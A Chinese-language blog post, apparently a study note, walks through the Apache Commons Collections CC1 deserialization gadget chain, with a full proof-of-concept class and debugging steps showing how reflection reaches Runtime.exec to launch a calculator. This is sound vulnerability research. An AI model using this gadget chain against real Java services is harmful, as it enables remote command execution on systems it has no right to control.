<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造方法</span><br>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; paramClass, Map&lt;String, Object&gt; paramMap)<br>&#123;<br>	<span class="hljs-keyword">this</span>.type = paramClass; <span class="hljs-comment">//this.type是我们传入的Annotation类型Class</span><br>	<span class="hljs-keyword">this</span>.memberValues = paramMap; <span class="hljs-comment">//memberValues为我们传入的map</span><br>&#125;<br><br><span class="hljs-comment">//readObject</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream paramObjectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="hljs-function"></span>&#123;<br>    paramObjectInputStream.defaultReadObject();<br>    <br>    AnnotationType localAnnotationType = <span class="hljs-keyword">null</span>;<br>    <br>    <span class="hljs-keyword">try</span><br>    &#123;<br>      localAnnotationType = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (IllegalArgumentException localIllegalArgumentException)<br>    &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br>    <br>    Map localMap = localAnnotationType.memberTypes(); <span class="hljs-comment">//获取注解类类型的map</span><br>    <br>    <span class="hljs-comment">//遍历map</span><br>    <span class="hljs-keyword">for</span> (Map.Entry localEntry : <span class="hljs-keyword">this</span>.memberValues.entrySet())<br>    &#123;<br>      <span class="hljs-comment">//获取map的key，也就是我们注解类</span><br>      String str = (String)localEntry.getKey();<br>      <span class="hljs-comment">//查询key的注解类接口的方法</span><br>      Class localClass = (Class)localMap.get(str);<br>      <br>      <span class="hljs-comment">//如果key注解下的方法，不能为空，否则不进入方法</span><br>      <span class="hljs-keyword">if</span> (localClass != <span class="hljs-keyword">null</span>)<br>      &#123;<br>        <span class="hljs-comment">//获取value的对象</span><br>        Object localObject = localEntry.getValue();<br>        <span class="hljs-comment">//判断localClass是否可以与我们传入的bbb字符串进行强转，以及判断是不是ExceptionProxy对象</span><br>        <span class="hljs-keyword">if</span> ((!localClass.isInstance(localObject)) &amp;&amp; (!(localObject <span class="hljs-keyword">instanceof</span> ExceptionProxy))) &#123;<br>          <br>          localEntry.setValue(<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(localObject<br>          <br>            .getClass() + <span class="hljs-string">&quot;[&quot;</span> + localObject + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>            (Method)localAnnotationType.members().get(str)));<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<p>执行到setValue，有两个条件</p>
<p>第一个参数要求注解类，第二个参数即为我们想要赋值的变量memberValues</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303170220.png"></p>
</br>

<h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><h3 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>        AnnotationInvocationHandler.readObject()<br>            (Map.Entry)TransformedMap.checkSetValue<br>            	ChainedTransformer.transform()<br>                	ConstantTransformer.transform()<br>                    	InvokerTransformer.transform()<br>                        	Method.invoke()<br>                            	Class.getMethod()<br>                        InvokerTransformer.transform()<br>                        	Method.invoke()<br>                            	Runtime.getRuntime()<br>                        InvokerTransformer.transform()<br>                            Method.invoke()<br>                                Runtime.exec()<br></code></pre></td></tr></table></figure>

</br>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.python.antlr.ast.Str;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap();<br><br>        <span class="hljs-comment">//valueTransformer.transform(value)</span><br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        <span class="hljs-comment">//传入keyTransformer、valueTransformer</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-keyword">null</span>,chainedTransformer);<br><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationHadlConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationHadlConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object o = annotationInvocationHadlConstructor.newInstance(Target.class, transformedMap);<br><br>        serialize(o);<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-comment">//序列化和反序列化</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// ObjectOutputStream 对象输出流，将Person对象存储到E盘的Person.txt文件中，完成对Person对象的序列化操作</span><br>        ObjectOutputStream oo = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        oo.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<br>            <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        Object object = (Object) ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！&quot;</span>);<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

</br>

<p>注解版方便分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.python.antlr.ast.Str;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(Runtime.getRuntime());</span><br><span class="hljs-comment">//        Transformer[] transformers = new Transformer[] &#123;&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;&#125;;</span><br><span class="hljs-comment">//        Runtime r = Runtime.getRuntime();</span><br><br><span class="hljs-comment">//        Class c = Runtime.class;</span><br><span class="hljs-comment">//        Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);</span><br><span class="hljs-comment">//        Runtime runtime = (Runtime) getRuntime.invoke(null, null);</span><br><span class="hljs-comment">//        Method exec = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        exec.invoke(runtime,&quot;calc&quot;);</span><br><br><span class="hljs-comment">//        Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="hljs-comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class); //Runtime.getRuntime()</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;).transform(method);//method.invoke</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(Runtime.class);</span><br><br><span class="hljs-comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br>        <span class="hljs-comment">//invokerTransformer.transform(r);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap();<br><br>        <span class="hljs-comment">//valueTransformer.transform(value)</span><br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        <span class="hljs-comment">//传入keyTransformer、valueTransformer</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-keyword">null</span>,chainedTransformer);<br><br><span class="hljs-comment">//        for (Map.Entry entry : transformedMap.entrySet())&#123;</span><br><span class="hljs-comment">//            entry.setValue(r);</span><br><span class="hljs-comment">//        &#125;</span><br><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationHadlConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationHadlConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object o = annotationInvocationHadlConstructor.newInstance(Target.class, transformedMap);<br><br>        serialize(o);<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-comment">//序列化和反序列化</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// ObjectOutputStream 对象输出流，将Person对象存储到E盘的Person.txt文件中，完成对Person对象的序列化操作</span><br>        ObjectOutputStream oo = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        oo.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<br>            <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        Object object = (Object) ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！&quot;</span>);<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h3 id="回溯分析"><a href="#回溯分析" class="headerlink" title="回溯分析"></a>回溯分析</h3><p>首先我们要找到一个函数可以任意方法调用，并且判断传入的参数我们是否可控</p>
<p>我们可以看到Method方法和参数类型我们是可控的，object我们可以看看有没有函数调用transform传入Object</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303202646.png"></p>
<p>通过查看transform函数调用，可以看到下面ChainedTransformer的transform方法</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303202927.png"></p>
<p>我们可以看到这边对iTransformers数组进行递归执行transform，所以说iTransformers是要为InvokerTransformer</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303203236.png"></p>
<p>尝试使用Runtime.getRuntime().exec(“calc”)，来进行调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(Runtime.getRuntime());<br></code></pre></td></tr></table></figure>

<p>后面我们就要找谁调用transform方法</p>
<p>我们继续往下找看谁调用了ChainedTransformer.transform，并且也传入object对象，而且是一个Transformer数组</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303204739.png"></p>
<p>我们可以看到checkSetValue方法，调用valueTransformer的transform方法</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303204817.png"></p>
<p>可以看到调用decorate传入到构造方法，所以说valueTransformer</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303204948.png"></p>
<p>TransformedMap.checkSetValue调用了transform并且传入了对象</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303205823.png"></p>
<p>调用了decorate，valueTransformer传入了invokerTransformer，因为checkSetValue的访问控制是protected无法直接被调用，此时还无法造成命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Runtime r = Runtime.getRuntime();<br>InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-comment">//invokerTransformer.transform(r);</span><br>HashMap&lt;Object, Object&gt; Map = <span class="hljs-keyword">new</span> HashMap();<br>TransformedMap.decorate(Map,<span class="hljs-keyword">null</span>,invokerTransformer);<br></code></pre></td></tr></table></figure>

</br>

<p>AbstractInputCheckedMapDecorator的MapEntry调用了setVlalue方法，MapEntry就是有个键值对</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223127.png"></p>
<p>我们可以看到这种类继承的是AbstractMapDecorator，重写了setValue，AbstractMapEntryDecorator最终还是实现Map.Entry</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304104552.png"></p>
<p>这个就是遍历键值对的写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap();<br>map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-keyword">for</span> (Map.Entry entry:map.entrySet())&#123;<br>	System.out.println(entry);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当我们遍历被修饰过map的方法就会调用到AbstractInputCheckedMapDecorator下的setVlalue</p>
</br>

<p>之后我们再看那个方法调用了setValue，并且是readObject方法</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303210656.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Runtime r = Runtime.getRuntime();<br>InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-comment">//invokerTransformer.transform(r);</span><br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap();<br><br><span class="hljs-comment">//valueTransformer.transform(value)</span><br>map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br><span class="hljs-comment">//传入keyTransformer、valueTransformer</span><br>Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-keyword">null</span>,invokerTransformer);<br><br><span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet())&#123;<br>	entry.setValue(r); <span class="hljs-comment">//传入对象</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>AnnotationInvocationHandler类可以看到这里的localEntry调用setValue方法，完成了调用链</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303210810.png"></p>
<p>因为可以看到方法并没有，所以是default类型，我们只能通过反射来调用这个</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304160423.png"></p>
<p>第一个参数是一个注解类，第二个就是我们要传入的map对象来触发setValue</p>
</br>

<p>首先我们还有两个问题</p>
<ol>
<li>Runtime类是不能进行序列化，我们只能通过反射进行调用</li>
<li>还有一个就是在AnnotationInvocationHandler下的readObject方法下的setValue的值，我们是无法可控制的</li>
</ol>
</br>

<p><strong>Runtime反射</strong></p>
<p>正常反射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class c = Runtime.class;<br>Method getRuntime = c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>);<br>Runtime runtime = (Runtime) getRuntime.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>Method exec = c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>exec.invoke(runtime,<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>InvokerTransformer反射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br>Method method = (Method) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;).transform(Runtime.class); <span class="hljs-comment">//Runtime.getRuntime()</span><br>Runtime r = (Runtime) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;).transform(method);<span class="hljs-comment">//method.invoke</span><br><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure>

</br>

<p>通过ChainedTransformer做一个递归的调用</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223000.png"></p>
<p>ChainedTransformer通过传入Transformer数组进行递归调用到InvokerTransformer的transform，传入Runtime类，最终我们就可以获取去到exec执行弹出计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure>

<p>我们就可以传入ChainedTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br>ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br></code></pre></td></tr></table></figure>

</br>

<p>Runtime我们解决了，我们要解决下readObject方法调用setValue</p>
<p>尝试调试下，可以看到这边是我们前面传进的Override注解，这个memberTypes是获取到注解下的方法</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304174917.png"></p>
<p>继续向下调试，可以看到localMap.get对str进行查询，返回是0，说明没有查到，所以我们需要找到一个注解下存在一个方法的</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304174642.png"></p>
<p>可以看到Target下有个value方法</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304175204.png"></p>
<p>我们尝试将传入annotationInvocationHadlConstructor构造方法第一个参数的Override修改为Target注解，再次调试看看</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304175735.png"></p>
<p>尝试修改我们传入的key为value</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>之后判断localClass是否可以与我们传入的bbb字符串进行强转，以及判断是不是ExceptionProxy对象，返回的为true继续走到下面</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223020.png"></p>
<p>最终我们新增了ConstantTransformer传入Runtime.class对象，为什么这样做呢</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>    <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>我们走到当前的readObject方法的setValue上，真正触发到setValue是这个checkSetValue，我们可以调试一下</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304212928.png"></p>
<p>在checkSetValue上传入了我们写的Transformer数组</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304213056.png"></p>
<p>我们看下走进ChainedTransformer.transform</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304213315.png"></p>
<p>现在的object值</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304214927.png"></p>
<p>进入ConstantTransformer.transform方法后，这个方法返回一个object也就是我们的Runtime对象</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304213402.png"></p>
<p>再看下现在的object值，成功被ConstantTransformer返回的对象覆盖，这也就造成为什么我们不需要在setValue传入Runtime对象了</p>
